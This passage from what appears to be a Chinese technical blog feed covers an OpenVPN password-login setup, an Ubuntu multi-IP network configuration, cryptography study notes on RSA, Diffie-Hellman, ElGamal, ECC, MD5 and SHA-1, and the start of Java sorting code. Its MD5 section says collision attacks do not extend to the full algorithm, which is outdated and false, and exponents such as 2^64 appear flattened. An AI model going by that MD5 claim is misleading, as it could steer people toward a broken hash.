755 /etc/openvpn/checkpsw.sh</p></blockquote><p>在/etc/openvpn目录下添加用户名密码文件psw-file:</p><blockquote><p>vim /etc/openvpn/psw-file</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user1 pass1 # 用户名 密码以空格隔开</div><div class="line">user2 pass2</div></pre></td></tr></table></figure><p>安全起见设成只读：</p><blockquote><p>chmod 400 /etc/openvpn/psw-file   </p></blockquote><p>重启服务：</p><blockquote><p>service openvpn restart</p></blockquote><h3 id="0x02-客户端配置"><a href="#0x02-客户端配置" class="headerlink" title="0x02 客户端配置"></a>0x02 客户端配置</h3><p>在服务器安装openvpn时生成的client.ovpn末尾加入一行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">auth-user-pass</div></pre></td></tr></table></figure><p>重新导入openvpn GUI即可使用用户名密码登陆.</p><h3 id="0x03-坑点"><a href="#0x03-坑点" class="headerlink" title="0x03 坑点"></a>0x03 坑点</h3><p>使用openvpn-install.sh安装时，选择TCP(默认)方式无法使用用户名密码登陆，选择UDP则没有问题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;openvpn实现用户名密码登陆&quot;&gt;&lt;a href=&quot;#openvpn实现用户名密码登陆&quot; class=&quot;headerlink&quot; title=&quot;openvpn实现用户名密码登陆&quot;&gt;&lt;/a&gt;openvpn实现用户名密码登陆&lt;/h2&gt;&lt;h3 id=&quot;0x00-open
      
    
    </summary>
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu16.04单网卡配置多ip</title>
    <link href="http://yoursite.com/2019/02/24/ubuntu16.04%E5%8D%95%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE%E5%A4%9Aip/"/>
    <id>http://yoursite.com/2019/02/24/ubuntu16.04单网卡配置多ip/</id>
    <published>2019-02-24T14:08:35.634Z</published>
    <updated>2019-02-24T14:09:32.965Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ubuntu16-04单网卡配置多ip"><a href="#ubuntu16-04单网卡配置多ip" class="headerlink" title="ubuntu16.04单网卡配置多ip"></a>ubuntu16.04单网卡配置多ip</h2><ul><li>环境：ubuntu16.04</li></ul><blockquote><p>vim /etc/network/interfaces</p></blockquote><ul><li>默认配置：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">##lo配置 </div><div class="line">auto lo </div><div class="line">iface lo inet loopback </div><div class="line">##网卡eth0的配置 </div><div class="line">auto eth0 </div><div class="line">iface eth0 inet dhcp</div></pre></td></tr></table></figure><ul><li>双ip配置：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">##lo配置 </div><div class="line">auto lo </div><div class="line">iface lo inet loopback </div><div class="line">##虚拟出一个eth0:0 </div><div class="line">auto eth0 </div><div class="line">auto eth0:0 </div><div class="line">##配置eth0的ip,默认网关,子网掩码 </div><div class="line">iface eth0 inet static </div><div class="line">address 192.168.1.23 </div><div class="line">gateway 192.168.1.1 </div><div class="line">netmask 255.255.0.0 </div><div class="line">##配置eth0:0的ip,默认网关,子网掩码 </div><div class="line">iface eth0:0 inet static </div><div class="line">address 192.168.1.24 </div><div class="line">gateway 192.168.1.1 </div><div class="line">netmask 255.255.255.0</div></pre></td></tr></table></figure><ul><li>多ip配置：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">##lo配置 </div><div class="line">auto lo </div><div class="line">iface lo inet loopback </div><div class="line">##虚拟出两个：eth0:0和eth0:1 </div><div class="line">auto eth0 </div><div class="line">auto eth0:0 </div><div class="line">auto eth0:1 </div><div class="line">##配置eth0的ip,默认网关,子网掩码 </div><div class="line">iface eth0 inet static </div><div class="line">address 192.168.1.23 </div><div class="line">gateway 192.168.1.1 </div><div class="line">netmask 255.255.0.0 </div><div class="line">##配置eth0:0的ip,默认网关,子网掩码 </div><div class="line">iface eth0:0 inet static </div><div class="line">address 192.168.1.24 </div><div class="line">gateway 192.168.1.1 </div><div class="line">netmask 255.255.255.0 </div><div class="line">##配置eth0:1的ip,默认网关,子网掩码 </div><div class="line">iface eth0:1 inet static </div><div class="line">address 192.168.1.25 </div><div class="line">gateway 192.168.1.1 </div><div class="line">netmask 255.255.255.0</div></pre></td></tr></table></figure><ul><li>重启网络服务</li></ul><blockquote><p> $sudo service networking restart<br>或者sudo /etc/init.d/networking restart </p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ubuntu16-04单网卡配置多ip&quot;&gt;&lt;a href=&quot;#ubuntu16-04单网卡配置多ip&quot; class=&quot;headerlink&quot; title=&quot;ubuntu16.04单网卡配置多ip&quot;&gt;&lt;/a&gt;ubuntu16.04单网卡配置多ip&lt;/h2&gt;&lt;ul&gt;

      
    
    </summary>
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>密码学基础笔记(三)</title>
    <link href="http://yoursite.com/2019/02/21/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0(%E4%B8%89)/"/>
    <id>http://yoursite.com/2019/02/21/密码学基础笔记(三)/</id>
    <published>2019-02-21T10:07:02.226Z</published>
    <updated>2019-02-21T10:14:07.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第9章-公钥密码学与RSA"><a href="#第9章-公钥密码学与RSA" class="headerlink" title="第9章  公钥密码学与RSA"></a>第9章  公钥密码学与RSA</h2><blockquote><p>保密性：信息不被泄露给未经授权者的特性。</p></blockquote><h3 id="公钥密码体制的基本原理"><a href="#公钥密码体制的基本原理" class="headerlink" title="公钥密码体制的基本原理"></a><strong>公钥密码体制的基本原理</strong></h3><p>加密密钥≠解密密钥，加密密钥 ≠&gt; 解密密钥，加密和解密变换分开实现。</p><ul><li>公开加密密钥（公钥）：任何人利用这个公钥和算法向该用户发送加密信息。</li><li>保密解密密钥（私钥）：解密密文。</li></ul><p>公钥密钥密码体制的优点是：</p><ul><li>不需要安全信道传递密钥，大大简化了密钥管理。</li><li>实现了分组密码体制中无法实现的数字签名。</li></ul><h3 id="公钥密码体制"><a href="#公钥密码体制" class="headerlink" title="公钥密码体制"></a><strong>公钥密码体制</strong></h3><p>公钥密码体制的核心思想：<strong>加密和解密采用不同的密钥</strong>。这是公钥密码体制和对称密码体制最大的区别。</p><p><strong>加密模型</strong>:</p><p><img src="/images/mima3/1550731993820.png" alt="1550731993820"></p><p><strong>认证模型</strong>:</p><p><img src="/images/mima3/1550732036032.png" alt="1550732036032"></p><p><strong>加密认证模型</strong>:</p><p><img src="/images/mima3/1550732049338.png" alt="1550732049338"></p><h3 id="对公钥密码的要求"><a href="#对公钥密码的要求" class="headerlink" title="对公钥密码的要求"></a><strong>对公钥密码的要求</strong></h3><ol><li>接收方B产生密钥对（公钥PKB和私钥SKB）在计算上是容易的。</li><li>发方A用收方的公钥对消息m加密产生密文c，即c=EPKB[m]在计算上是容易的。</li><li>收方B用自己的秘密钥对c解密，即m=DSKB[c]在计算上是容易的。   </li><li>敌手由B的公钥PKB求私钥SKB在计算上是不可行的。</li><li>敌手由密文c和B的公钥PKB恢复明文m在计算上是不可行的。</li></ol><p><strong>要满足上述条件即是要找一个陷门单向函数。</strong></p><ul><li>单向函数：两个集合X、Y之间的一个映射，使得由x∈X易于计算它的像y=f(x)∈Y，由y计算它的原像x是不可行的。</li><li>易于计算：指函数值能在其输入长度的多项式时间内求出，即如果输入长n比特，则求函数值的计算时间是na的某个倍数，其中a是一固定的常数。这时称求函数值的算法属于多项式类P，否则就是不可行的。</li><li>陷门单向函数：指该函数是易于计算的，但求它的逆是不可行的，除非再已知某些附加信息。当附加信息给定后，求逆可在多项式时间完成。</li></ul><p>陷门单向函数是一族可逆函数fk，满足</p><ol><li>当已知k和X：Y=fk(X)易于计算</li><li>当已知k和Y：X=f-1k(Y)易于计算</li><li>当已知Y但未知k：X=f-1k(Y)计算上是不可行的</li></ol><h3 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h3><p><strong>算法描述</strong></p><p> <strong>1.</strong>  <strong>密钥的产生</strong></p><p>•选两个大素数p和q；（保密）</p><p>•计算n=p×q, ϕ(n)=(p−1)×(q−1); （n公开，ϕ(n)保密）</p><p>•随机选一整数e∈(1, ϕ(n))，满足：                    </p><p>gcd(ϕ(n), e) =1（公钥e）</p><p>•计算d，满足：d×e ≡ 1 (mod ϕ(n))（私钥d）</p><p><strong>2.</strong>  <strong>加密</strong></p><p><img src="/images/mima3/1550732407966.png" alt="1550732407966"></p><p><strong>3.</strong>  <strong>解密</strong></p><p><img src="/images/mima3/1550732412328.png" alt="1550732412328"></p><h2 id="第10章-密钥管理和其他公钥密码体制"><a href="#第10章-密钥管理和其他公钥密码体制" class="headerlink" title="第10章  密钥管理和其他公钥密码体制"></a>第10章  <strong>密钥管理和其他公钥密码体制</strong></h2><h3 id="Diffie-Hellman密钥交换"><a href="#Diffie-Hellman密钥交换" class="headerlink" title="Diffie-Hellman密钥交换"></a>Diffie-Hellman密钥交换</h3><blockquote><p>Diffie和Hellman于1976年提出，许多商业产品都使用了这种密钥交换技术。</p></blockquote><p><strong>算法描述</strong></p><ol><li>用户A随机选择一个私有的大整数xA&lt;q，计算<img src="/images/mima3/1550732589478.png" alt="1550732589478">，并将结果传送给用户B；</li><li>用户B随机选择一个私有的大整数xB&lt;q，计算 <img src="/images/mima3/1550732596786.png" alt="1550732596786"> ，并将结果传送给用户A；</li></ol><p>​    3）用户A计算：<img src="/images/mima3/1550732562968.png" alt="1550732562968"></p><p>​    4）用户B计算：<img src="/images/mima3/1550732565911.png" alt="1550732565911"></p><p><img src="/images/mima3/1550732619968.png" alt="1550732619968"></p><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3><ul><li>用户A将YA发送给B的过程中，中间人D截取YA，并用自己的YD取代YA发送给用户B。</li><li>用户B将YB发送给A的过程中，中间人D截取YB，并用自己的yD取代YB发送给A。</li><li>A、B和D三者分别计算会话密钥：</li></ul><p>​         A与D共享会话密钥KA：</p><p>​         B与D共享会话密钥KB：</p><p>​       一般情况下KA ≠ KB ，但A与B对此一无所知。</p><h3 id="ElGamal密码体制"><a href="#ElGamal密码体制" class="headerlink" title="ElGamal密码体制"></a>ElGamal密码体制</h3><blockquote><p>ElGamal密码体制是ElGamal于1984年提出，除了RSA密码体制之外著名的公钥密码体制之一。安全性基于<strong>离散对数问题的困难性</strong>。</p></blockquote><p><strong>ElGamal算法</strong></p><p><strong>(1)</strong>  <strong>参数定义和密钥生成</strong></p><ul><li>选取大素数p，g∈Zp*是一个本原元素（生成元）。</li><li>p，g为系统中所有用户共享。</li><li>系统中每个用户U都随机挑选一个整数xU，1≤ xU ≤ p−1，并计算：</li></ul><p><img src="/images/mima3/1550732762533.png" alt="1550732762533"></p><p>​     用户U的<strong>公钥为yU</strong>，<strong>私钥为xU</strong>。</p><p><strong>(2)</strong>  <strong>加密算法</strong></p><ul><li>A选择一个随机数r∈[2，p-2]并计算：</li></ul><p><img src="/images/mima3/1550732828112.png" alt="1550732828112"></p><p><img src="/images/mima3/1550732832264.png" alt="1550732832264"> </p><p><strong>(3)</strong>  <strong>解密算法</strong></p><ul><li>B接收到密文(c1，c2)后，计算：</li></ul><p><img src="/images/mima3/1550732884169.png" alt="1550732884169"></p><h3 id="椭圆曲线密码学"><a href="#椭圆曲线密码学" class="headerlink" title="椭圆曲线密码学"></a>椭圆曲线密码学</h3><p>椭圆曲线密码体制（Elliptic Curve Cryptography，ECC）：</p><ul><li>利用有限域上椭圆曲线的点集构成的群实现。</li><li>安全性基于椭圆曲线上求<strong>离散对数问题</strong>的困难性。</li><li>由于椭圆曲线密码体制具有计算量小，处理速度快、存储空间占用小、带宽要求低等优点，在电子商务、电子政务等应用领域得到广泛关注。</li></ul><p><strong>定义</strong></p><p>椭圆曲线主要有：</p><ul><li>实数域上的椭圆曲线</li><li>有限域GF(p)上的椭圆曲线</li><li>有限域GF(2m)上的椭圆曲线</li></ul><blockquote><p>不同数域上的椭圆曲线的表示形式不一样，甚至其上的运算也不一样。</p></blockquote><p><strong>椭圆曲线上的密码体制（ECC）：</strong>有限域椭圆曲线上的任意两个点相加，结果仍然是曲线上的点。</p><ul><li>所有点都落在某一个区域内，组成一个有限Abel群，与密码长度相对应。</li><li>密码长度越长，这个区域就越大，安全层次就越高，但计算机速度越慢，反之亦然。</li><li>椭圆曲线密码体制的安全性在于椭圆曲线点群上的<strong>离散对数问题的困难性</strong>。</li><li>已知椭圆曲线Ep(a, b)和点G，随机生成一个整数d，容易计算Q=d×G，但给定Q和G计算d就相对困难。</li></ul><h3 id="椭圆曲线密码的安全性"><a href="#椭圆曲线密码的安全性" class="headerlink" title="椭圆曲线密码的安全性"></a><strong>椭圆曲线密码的安全性</strong></h3><p>ECC在理论上和实践上都取得了很大的进展，它是代替RSA公钥密码体制最强有力的竞争者。与RSA算法相比，ECC有以下的优点：</p><ul><li>ECC使用的密钥比RSA中使用的密钥要短得多。</li><li>密钥长度相同时，ECC与RSA所需的计算量差不多。</li></ul><p>因此，与具有同等安全性的RSA相比，由于ECC使用的密钥更短，所以ECC所需的计算量比RSA少。</p><h2 id="第11章-Hash函数"><a href="#第11章-Hash函数" class="headerlink" title="第11章  Hash函数"></a>第11章  Hash函数</h2><blockquote><p>完整性（Integrity）：指信息在存储或传输过程中保持未经授权不能改变的特性。</p></blockquote><h3 id="Hash函数"><a href="#Hash函数" class="headerlink" title="Hash函数"></a>Hash函数</h3><p>Hash函数把<strong>任意长度的输入，通过算法变换成固定长度的输出</strong>，该输出就是Hash值或消息摘要（Message Digest）。</p><p>设H：X→Y是一个Hash函数，X表示所有消息的集合（有限集或无限集），Y表示所有消息摘要构成的有限集合。</p><p>Hash函数H具有单向性：</p><ul><li>从x计算y=H(x)是容易的</li><li>从y=H(x)计算x是困难的</li></ul><p>对于Hash函数的安全要求，通常采用下面的三个问题来进行判断：</p><ol><li>已知y∈Y，寻找x∈X，使得H(x)=y。</li><li>已知x∈X，寻找x’∈X，使得x’≠x，并且H(x’)=H(x)。</li><li>寻找x，x’∈X，使得x’≠x，并且H(x’)=H(x)。</li></ol><blockquote><p>如果一个Hash函数对这三个问题都是难解的，即计算上不可行，则认为它是安全的。</p><p>如果有两个消息x，x’∈X，x’≠x，且H(x’)=H(x)，我们就说这两个消息是碰撞消息。</p></blockquote><ul><li><strong>单向：</strong>第(1)个问题不可解。</li><li><strong>抗弱碰撞：</strong>第(1)和(2)问题不可解。</li><li><strong>抗强碰撞：</strong>第(1)和(3)问题不可解。</li></ul><h3 id="Hash函数的构造方法"><a href="#Hash函数的构造方法" class="headerlink" title="Hash函数的构造方法"></a><strong>Hash函数的构造方法</strong></h3><p>构造Hash函数的方法主要有：</p><ul><li>基于公钥密码的构造方法</li><li>基于分组密码的构造方法</li><li>直接构造法</li></ul><p><strong>1.</strong>  <strong>基于公钥密码的构造方法</strong></p><p>​        设明文M=m1m2…mn，以公钥密码体制为基础，使用公钥PK及初始变量IV，通过密文分组链接（CBC）模式对消息分组进行加密，得到密文分组。将输出的最后一个密文分组<strong>c**</strong>n**作为Hash函数的输出值H(M)。</p><p><img src="/images/mima3/1550733793187.png" alt="1550733793187"></p><p><strong>2.</strong>  <strong>基于分组密码的构造方法</strong></p><p>​       设明文M=m1m2…mn，使用CBC模式，输入初始变量IV和对称密钥k，对消息分组进行加密，得到密文分组。将输出的最后一个密文分组<strong>c**</strong>n**作为Hash函数的输出值H(M)。</p><p><img src="/images/mima3/1550733803578.png" alt="1550733803578"></p><p><strong>3.</strong>  <strong>直接构造Hash函数</strong></p><p>​        这类Hash函数并不基于任何假设和密码体制，它是通过直接构造复杂的非线性关系达到单向性要求来设计单向Hash函数。这类Hash函数典型的有：MD4、MD5、SHA-1、SHA-256等算法。</p><h3 id="MD5算法"><a href="#MD5算法" class="headerlink" title="MD5算法"></a><strong>MD5算法</strong></h3><blockquote><p>MD5（Message-Digest Algorithm 5）算法由Rivest在1991年提出的一种Hash函数，经MD2、MD3和MD4发展而来。</p></blockquote><p><strong>MD5算法描述</strong></p><p>MD5算法采用迭代型Hash函数的一般结构：</p><p>•算法的输入为任意长的消息M。</p><p>•M分为512 bit长的块，每个块又划分为十六个32 bit的子块。</p><p>•算法的输出是由四个32 bit的块组成，将它们级联成一个128 bit的消息摘要。</p><p><strong>算法步骤</strong></p><p><strong>(1)</strong>  <strong>消息填充</strong></p><p>​       对X bit长的消息填充：</p><p>•使填充后的消息bit长度X1≡448 (mod 512)，即填充后的消息长度为512bit的某一倍数减64bit，留出的64bit备第(2)步使用。</p><p>•填充方式是固定的，即第1位为1，其后各位皆为0。</p><p>•如果消息长度X为448bit，仍需填充512bit，使其长度变为960bit，因此填充的bit数大于等于1而小于等于512</p><p> <strong>(2)</strong>  <strong>附加上消息的长度值</strong></p><p>​       用步骤(1)留出的64bit以Little-endian方式来表示消息被填充前的长度值。</p><p>•如果消息长度大于264，则以264为模数取模，即64bit存放的是X (mod 264)的二进制表示值。</p><p>•Little-endian方式是指数据的低位有效字节（或有效位）存于低地址字节（或位），高位有效字节（或有效位）存于高地址字节（或位）。</p><p>​       用步骤(1)留出的64bit以Little-endian方式来表示消息被填充前的长度值。</p><p>​        前两步执行完后，消息的长度为512bit的倍数（设为L倍），则可将消息划分为L个长度为512bit的块m0, m1, …, mL-1，而每一块又可划分为16个32bit长的子块。</p><p><strong>(3)</strong>  <strong>缓冲区初始化</strong></p><p>​       算法使用了128bit长的缓冲区以存储中间结果和最终的消息摘要，缓冲区可表示为4个32bit长的寄存器A、B、C、D，每个寄存器都以Little-endian方式存储数据，其初值（用十六进制表示）取为：</p><p>​                              A = 01234567</p><p>​                              B = 89abcdef </p><p>​                              C = fedcba98</p><p>​                              D = 76543210</p><p><strong>(4)</strong>  <strong>压缩函数处理</strong></p><p>​       以块为单位对消息进行处理，每一消息块mj（j = 0, …, L-1）都经一压缩函数HMD5处理。压缩函数有4轮处理过程，每一轮由16步迭代组成。</p><p><img src="/images/mima3/1550733997671.png" alt="1550733997671"></p><p><strong>(5)</strong>  <strong>输出消息摘要</strong></p><p>​       L个消息块mj（j = 0, …, L-1）都被处理完后，最后一个压缩函数的输出即为产生的128bit消息摘要。</p><h3 id="压缩函数的处理过程"><a href="#压缩函数的处理过程" class="headerlink" title="压缩函数的处理过程"></a><strong>压缩函数的处理过程</strong></h3><p>压缩函数HMD5的4轮处理过程相似，分别用逻辑函数FF、GG、HH、II表示，它们分别为是</p><ul><li>FF  (A, B, C, D, M[k], S, T[i])</li><li>GG(A, B, C, D, M[k], S, T[i])</li><li>HH(A, B, C, D, M[k], S, T[i])</li><li>II   (A, B, C, D, M[k], S, T[i])</li></ul><p>的缩写。</p><p>​       每轮的输入为当前处理的消息块mi和缓冲区的当前值A、B、C、D，输出仍放在缓冲区中以产生新的A、B、C、D。经过4轮运算，第4轮的输出再与第1轮的输入按模232相加，相加的结果即为压缩函数HMD5的输出。</p><h3 id="MD5算法的安全性"><a href="#MD5算法的安全性" class="headerlink" title="MD5算法的安全性"></a><strong>MD5算法的安全性</strong></h3><p>目前对MD5的攻击已取得以下结果：</p><p>​        (1)  对单轮的MD5，使用差分密码分析可在合理的时间内找出具有相同Hash值的两个消息。但这种攻击还未能成功地推广到4轮MD5。</p><p>​        (2)  可找出一个消息块和两个相关的缓冲区变量ABCD的不同输入值，MD5对单个512bit消息块的运算得到相同的输出。目前这种攻击还未能成功地推广到整个算法。</p><p>​    (3) 对单个512bit长的消息块已成功地找出了碰撞，即可找出另一个消息块，使得经过MD5运算，两个消息块的输出Hash值相同。目前这种攻击还未成功推广到一个具有初值IV的整个消息上。</p><h3 id="SHA-1算法"><a href="#SHA-1算法" class="headerlink" title="SHA-1算法"></a><strong>SHA-1算法</strong></h3><blockquote><p>SHA（Secure Hash Algorithm）算法由美国国家标准和技术协会（NIST）提出，并作为联邦信息处理标准（FIPS PUB 180）在1993年公布。</p><p>两年之后，SHA-1，第一个SHA的后继者发布了。为了提升输出的范围和变更一些细微设计，另外还有四种变体曾经发布：SHA-224, SHA-256，SHA-384 和SHA-512（这些也称作SHA-2）。</p></blockquote><p>这里介绍SHA-1算法，其结构与MD5非常类似：</p><ul><li>输入消息的最大长度不超过264 bit</li><li>输入消息按照512 bit的块进行处理</li><li>产生160 bit的消息摘要</li></ul><h3 id="SHA-1算法描述"><a href="#SHA-1算法描述" class="headerlink" title="SHA-1算法描述"></a><strong>SHA-1算法描述</strong></h3><p>​       <strong>(1)</strong>  <strong>消息填充</strong></p><p>​       消息填充过程与MD5的步骤(1)相同，设输入的消息为M，X≤264-1表示消息的长度。</p><p>•使填充后的消息长度X1≡448 (mod 512)，即填充后的消息长度为512bit的某一倍数减64bit，留出的64bit备第(2)步使用。</p><p>•填充方式是第1位为1，其后各位皆为0。</p><p>•如果消息长度X=448bit，仍需填充512bit，使其长度变为960bit，因此填充位数是1~512比特。</p><p>​       <strong>(2)</strong>  <strong>附加上消息的长度值</strong></p><p>​       用步骤(1)留出的64比特以Big-endian方式来表示消息被填充前的长度值，即64比特存放的是消息长度X的二进制表示值。</p><p>​       前两步执行完后，消息的长度为512的倍数（设为L），将消息划分为L个长度为512bit的块m0，m1，…，mL-1，每一块又可划分为16个32比特长的子块。</p><p>​       <strong>(3)</strong>  <strong>缓冲区初始化</strong></p><p>​       算法使用了160bit长的缓冲区以存储中间结果和最终的消息摘要，缓冲区可表示为5个32比特长的寄存器A、B、C、D、E。每个寄存器都以Big-endian方式存储数据，其初值（用十六进制表示）取为</p><p>​             A=67452301           B=efcdab89</p><p>​             C=98badcfe            D=10325476</p><p>​             E=c3d2e1f0</p><p>​       <strong>(4)</strong>  <strong>压缩函数处理</strong></p><p>​       以块为单位对消息进行处理，每一消息块mj（j=0, …, L-1）都经一压缩函数HSHA处理。压缩函数有4轮处理过程，每一轮由20步迭代组成。</p><p><img src="/images/mima3/1550734346217.png" alt="1550734346217"></p><p>​       <strong>(5)</strong>  <strong>输出消息摘要</strong></p><p>​       L个消息块mj（j=0,…,L-1）都被处理完后，最后一个分组的输出即为160比特的消息摘要。</p><h3 id="MD5与SHA-1的比较"><a href="#MD5与SHA-1的比较" class="headerlink" title="MD5与SHA-1的比较"></a><strong>MD5与SHA-1的比较</strong></h3><p>​       两种算法相似点在于：</p><ol><li>结构类似：都是以MD4为基础设计的。</li><li>算法描述起来都较为简单：实现起来也较为简单，均不需要较大的程序和代换表。</li></ol><p>​       两种算法不同点在于：</p><ol><li>抗攻击的强度：SHA-1抗穷举攻击的强度高于MD5抗穷举攻击的强度。</li><li>速度和效率：在相同硬件上实现时，SHA-1的速度要比MD5的速度慢，MD5的执行效率比SHA-1高。</li><li>数据的存储方式：MD5使用Little-endian方式，SHA-1使用Big-endian方式。</li></ol><h3 id="Hash函数的攻击"><a href="#Hash函数的攻击" class="headerlink" title="Hash函数的攻击"></a><strong>Hash函数的攻击</strong></h3><p>​      假设攻击者知道Hash算法，攻击者的主要目标：</p><ul><li>寻找具有给定消息摘要的一对或多对碰撞消息。</li><li>寻找具有相同消息摘要的一对或多对碰撞消息。</li></ul><blockquote><p>评价Hash函数的好坏最简单的方法是看攻击者找到一对碰撞消息所花的代价有多大。   </p></blockquote><p>​       <strong>1.</strong>  <strong>生日问题</strong></p><p>​       生日攻击来自于概率论中的生日问题：在一个教室中至少要有k个学生才能够使得有两个学生生日相同的概率大于1/2，求k值至少多大？</p><p>​       P(n, k)：n种取法，共取k次，发生碰撞的概率。则生日问题可记为P(365, k)≥1/2，则k为多少？</p><ul><li>k=23：P(365, 23)=0.5073</li><li>k=100：P(365, 100)=0.9999997  </li></ul><p>​       <strong>2.</strong>  <strong>寻找具有相同输出摘要的碰撞消息</strong></p><p>​       已知Hash函数有n个可能的输出摘要，特别地，如果输出摘要为m比特长，即可能的输出摘要个数n=2m，若Hash函数k个随机输入消息中至少有两个产生相同输出的概率大于1/2，求k值至少多大。</p><p>​       生日攻击意味着要保证消息摘要对碰撞问题是安全的，消息摘要的长度应该有一个下界。</p><ul><li>例如，长度为40比特的消息摘要是非常不安全的，因为仅仅220个随机Hash函数值中就有1/2的概率发生一次碰撞。</li><li>对于安全的消息摘要，现在实际使用的消息摘要一般为160比特或者更长。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第9章-公钥密码学与RSA&quot;&gt;&lt;a href=&quot;#第9章-公钥密码学与RSA&quot; class=&quot;headerlink&quot; title=&quot;第9章  公钥密码学与RSA&quot;&gt;&lt;/a&gt;第9章  公钥密码学与RSA&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;保密性：信息不被泄露给
      
    
    </summary>
    
    
      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>排序算法总结</title>
    <link href="http://yoursite.com/2019/02/07/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/02/07/排序算法总结/</id>
    <published>2019-02-07T08:56:52.093Z</published>
    <updated>2019-03-01T03:58:55.325Z</updated>
    
    <content type="html"><![CDATA[<h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><h4 id="直接插入"><a href="#直接插入" class="headerlink" title="直接插入"></a>直接插入</h4><p><img src="/images/sort/insertion_sort.gif" alt="insertion_sort"></p><ul><li><p>插入排序(稳定)</p></li><li><p>时间复杂度O(n^2)</p></li><li>空间复杂度O(1)</li><li>代码实现：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InsertionSort</span> </span>&#123; </div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line"><span class="comment">//给出无序数组</span></div><div class="line"><span class="keyword">int</span> arr[] = &#123;<span class="number">72</span>,<span class="number">6</span>,<span class="number">57</span>,<span class="number">88</span>,<span class="number">60</span>,<span class="number">42</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">48</span>,<span class="number">85</span>&#125;;</div><div class="line"><span class="comment">//输出无序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"><span class="comment">//插入排序</span></div><div class="line">insertionSort(arr);</div><div class="line"><span class="comment">//输出有序数组</span></div><div class="line">System.out.println(Arrays.toString(arr));</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertionSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;arr.length; i++) &#123;</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=i-<span class="number">1</span>; j&gt;=<span class="number">0</span>; j--) &#123;</div><div class="line"><span class="keyword">if</span>(arr[j+<span class="number">1</span>]&lt;arr[j]) &#123;</div><div class="line"><span class="keyword">int</span> temp = arr[j+<span class="number">1</span>];</div><div class="line">arr[j+<span class="number">1</span>] = arr[j];</div><div class="line">arr[j] = temp;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h4><ul><li>希尔排序(不稳定)</li><li>设置步长，分组插入排序</li></ul><p><img src="/images/sort/shellSort.png" alt="shellSort"></p><ul><li>代码实现：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div 